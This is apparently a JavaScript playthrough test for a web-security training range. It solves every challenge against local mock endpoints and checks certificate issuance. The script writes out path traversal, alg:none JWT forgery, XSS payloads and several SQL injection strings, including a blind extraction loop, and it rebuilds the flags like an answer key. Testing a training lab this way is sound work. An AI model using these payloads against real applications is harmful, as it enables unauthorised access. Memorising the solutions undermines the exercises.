import { readFileSync } from "node:fs";
import { db, USER } from "./db.mjs";

const REPO = "/home/user/Hack_guidance";
const servers = {};
globalThis.Deno = {
  env: { get: n => ({ BLACK_TRACE_SECRET: "local-selftest-secret", RANGE_TOKEN_SECRET: "local-range-secret",
                      SUPABASE_URL: "http://local", SUPABASE_ANON_KEY: "a", SUPABASE_SERVICE_ROLE_KEY: "s" })[n] },
  serve: fn => { servers.pending = fn; },
};
const load = async (file, name) => { await import(file); servers[name] = servers.pending; };
await load("./learning-index.js", "learning");
await load("./black-trace-index.js", "trace");
await load("./range-index.js", "range");

const AUTH = { Authorization: "Bearer selftest", apikey: "k", Origin: "https://grayom.github.io" };
const learn = async (action, payload = {}) => {
  const r = await servers.learning(new Request("https://x/hg-learning", {
    method: "POST", headers: { ...AUTH, "Content-Type": "application/json" },
    body: JSON.stringify({ action, ...payload }) }));
  return { status: r.status, body: await r.json().catch(() => ({})) };
};
const channel = (mode, init = {}) => servers.trace(new Request(`https://x/hg-black-trace?mode=${mode}`, { ...init, headers: { ...AUTH, ...(init.headers ?? {}) } }));
const rangeCall = (qs, init = {}) => servers.range(new Request(`https://x/hg-range?${qs}`, { ...init, headers: { ...AUTH, ...(init.headers ?? {}) } }));
const rangeJson = async (qs, init) => (await rangeCall(qs, init)).json();

// --- the client's own flag composition, imported from the shared module the bundle uses ---
const sharedSrc = readFileSync(`${REPO}/shared/black-trace.ts`, "utf8");
const labels = Object.fromEntries([...sharedSrc.slice(sharedSrc.indexOf("export const traceLabels"), sharedSrc.indexOf("const tierNames"))
  .matchAll(/^\s{2}"?([a-z-]+)"?:\s*"([a-z_]+)",$/gm)].map(m => [m[1], m[2]]));
const vaultSuffix = /vaultTraceSuffix = "([^"]+)"/.exec(sharedSrc)[1];
const composeTrace = (key, token) => {
  const label = labels[key];
  if (!label) return null;
  const body = token ? `${label}_${token}` : label;
  return key === "fragmented-key" ? `FLAG{${body}_` : `FLAG{${body}}`;
};
const nodes = [...sharedSrc.matchAll(/id: (\d+),\s*\n\s*key: "([a-z-]+)",[\s\S]*?title: "([^"]+)",[\s\S]*?surface: "([a-z-]+)"/g)]
  .map(m => ({ id: +m[1], key: m[2], title: m[3], surface: m[4] }));

const headerOf = async (mode, init) => (await channel(mode, init)).headers.get("X-Trace-Note");
const b64u = o => Buffer.from(JSON.stringify(o)).toString("base64url");

/** How an operator actually obtains each channel-issued trace. Never read from the answer table. */
async function recover(node) {
  const k = node.key;
  if (k === "robot-rules") return /FLAG\{[a-z_]+\}/.exec(readFileSync(`${REPO}/client/public/robots.txt`, "utf8"))[0];
  if (k === "sitemap") return decodeURIComponent(/FLAG%7B[a-z_]+%7D/.exec(readFileSync(`${REPO}/client/public/sitemap.xml`, "utf8"))[0]);
  if (k === "source-map") return /FLAG\{[a-z_]+\}/.exec(readFileSync(`${REPO}/client/public/legacy/report.js.map`, "utf8"))[0];
  if (k === "silent-response") return (await (await channel("response")).json()).trace;
  if (k === "server-whisper") return headerOf("header");
  if (k === "ask-it-yourself") return headerOf("firsthand");
  if (k === "follow-the-trail") {
    const r = await channel("redirect", { redirect: "manual" });
    return decodeURIComponent(/FLAG%7B[a-z_]+%7D/.exec(r.headers.get("Location"))[0]);
  }
  if (k === "wrong-method") return (await (await channel("method", { method: "POST" })).json()).trace;
  if (k === "cookie-flags") {
    const r = await channel("cookie");
    return decodeURIComponent(/FLAG%7B[a-z_]+%7D|FLAG\{[a-z_]+\}/.exec(r.headers.get("Set-Cookie"))[0]);
  }
  if (k === "claimed-role") return (await (await channel("role", { headers: { "X-Client-Role": "operator" } })).json()).trace;
  if (k === "referer") return (await (await channel("referer", { headers: { Referer: "https://grayom.github.io/partner-portal/desk" } })).json()).trace;
  if (k === "etag") return /FLAG\{[a-z_]+\}/.exec((await channel("etag")).headers.get("ETag"))[0];
  if (k === "range") {
    const r = await channel("range", { headers: { Range: "bytes=0-31" } });
    return /FLAG\{[a-z_]+\}/.exec(await r.text())?.[0] ?? r.headers.get("X-Trace-Note");
  }
  if (k === "preflight") {
    const r = await channel("preflight", { method: "OPTIONS", headers: { "Access-Control-Request-Method": "POST" } });
    return r.headers.get("X-Allowed-Note") ?? r.headers.get("X-Trace-Note");
  }
  if (k === "status-only") return (await channel("ack")).headers.get("X-Ack-Note");
  if (k === "content-type") return (await (await channel("export", { headers: { Accept: "text/csv" } })).text()).match(/FLAG\{[a-z_]+\}/)?.[0];
  if (k === "two-requests") {
    // The first answer is a map: it names the second request rather than carrying the trace.
    const next = (await (await channel("dispatch")).json()).next;
    const ticket = new URLSearchParams(next.replace(/^\?/, "")).get("ticket");
    return (await (await channel(`dispatch-leg&ticket=${encodeURIComponent(ticket)}`)).json()).trace;
  }
  // --- chapter five: drive the mock application ---
  if (k === "someone-elses-order") return (await rangeJson("mode=order&id=1042")).order.note;
  if (k === "negative-quantity") return (await rangeJson("mode=checkout", { method: "POST", body: JSON.stringify({ quantity: -5 }) })).trace;
  if (k === "up-one-level") return /FLAG\{[a-z_]+\}/.exec((await rangeJson(`mode=doc&name=${encodeURIComponent("../private/credentials.txt")}`)).body)[0];
  if (k === "role-in-the-token") {
    const forged = `${b64u({ alg: "none", typ: "JWT" })}.${b64u({ sub: "op", role: "operator" })}.`;
    return (await rangeJson("mode=vault", { headers: { "x-range-token": forged } })).trace;
  }
  if (k === "twice-at-once") {
    await rangeJson("mode=reset", { method: "POST", body: "{}" });
    const pair = await Promise.all([rangeJson("mode=coupon", { method: "POST", body: "{}" }),
                                    rangeJson("mode=coupon", { method: "POST", body: "{}" })]);
    return pair.find(x => x.trace)?.trace;
  }
  if (k === "it-echoes-back") return (await rangeJson(`mode=search&q=${encodeURIComponent("<img src=x onerror=alert(1)>")}`)).trace;
  if (k === "it-stays-there") {
    await rangeJson("mode=note", { method: "POST", body: JSON.stringify({ note: "<svg onload=alert(1)>" }) });
    return (await rangeJson("mode=board")).trace;
  }
  if (k === "always-true") return (await rangeJson("mode=login", { method: "POST", body: JSON.stringify({ user: "admin", pass: "' or '1'='1" }) })).trace;
  if (k === "another-table") return (await rangeJson(`mode=lookup&id=${encodeURIComponent("0 union select label, secret from archive")}`)).trace;
  if (k === "yes-or-no") {
    const ask = async p => (await rangeJson(`mode=probe&user=${encodeURIComponent(`' or (select value from signals) like '${p}`)}`)).found;
    let got = "";
    for (let i = 0; i < 10; i += 1) {
      const c = "abcdefghijklmnopqrstuvwxyz".split("").find(async () => false) ?? null;
      let hit = null;
      for (const ch of "abcdefghijklmnopqrstuvwxyz") if (await ask(`${got}${ch}%`)) { hit = ch; break; }
      if (!hit) break;
      got += hit;
    }
    return (await rangeJson(`mode=probe&user=admin&answer=${got}`)).trace;
  }
  return null;
}

console.log(`플레이스루 시작 — 노드 ${nodes.length}개\n`);
let solved = 0; const failures = [];
for (const node of nodes) {
  const surface = await learn("blackTraceSurface", { stage: node.id });
  if (surface.status !== 200) { failures.push([node, `흔적 발급 실패 ${surface.status}`]); continue; }
  let flag = composeTrace(node.key, surface.body.token);
  if (node.key === "fragmented-key") {
    const frag = (await (await channel("vault")).json()).fragment;
    flag = `${flag}${frag}`;
  } else if (!flag) {
    flag = await recover(node);
  }
  if (!flag) { failures.push([node, "흔적을 얻지 못함"]); continue; }
  const sub = await learn("blackTraceSubmit", { stage: node.id, flag, hintCount: 0 });
  if (sub.body.correct) {
    solved += 1;
    console.log(`  ✓ ${String(node.id).padStart(2)} ${node.title.padEnd(32)} ${flag.slice(0, 44)}`);
  } else {
    failures.push([node, `제출 거부: ${sub.body.message ?? sub.body.error} (보낸 값 ${flag})`]);
    console.log(`  ✗ ${String(node.id).padStart(2)} ${node.title.padEnd(32)} ${sub.body.message ?? sub.body.error}`);
  }
}
console.log(`\n푼 문제: ${solved} / ${nodes.length}`);
if (failures.length) { console.log("\n실패:"); for (const [n, why] of failures) console.log(`  ${n.id} ${n.title}: ${why}`); }
console.log(`제약으로 거부된 단계: ${db.rejected.length ? db.rejected.join(", ") : "없음"}`);
// The gate has to be checked before anything is issued: once a certificate exists the routine
// returns the held code idempotently, which would make a short-of-complete run look like a pass.
console.log("\n--- 수료증 조건 ---");
const keys = [...db.progress.keys()];
const lastKey = keys[keys.length - 1];
const lastRow = db.progress.get(lastKey);
db.progress.delete(lastKey);
console.log("  49개만 푼 상태 :", JSON.stringify((await learn("issueCertificate")).body));
db.progress.set(lastKey, lastRow);
const first = (await learn("issueCertificate")).body;
const again = (await learn("issueCertificate")).body;
console.log("  50개 전부     :", JSON.stringify(first));
console.log("  다시 요청     :", again.certificateCode === first.certificateCode ? "같은 코드 ✓" : "코드가 바뀜 ✗");
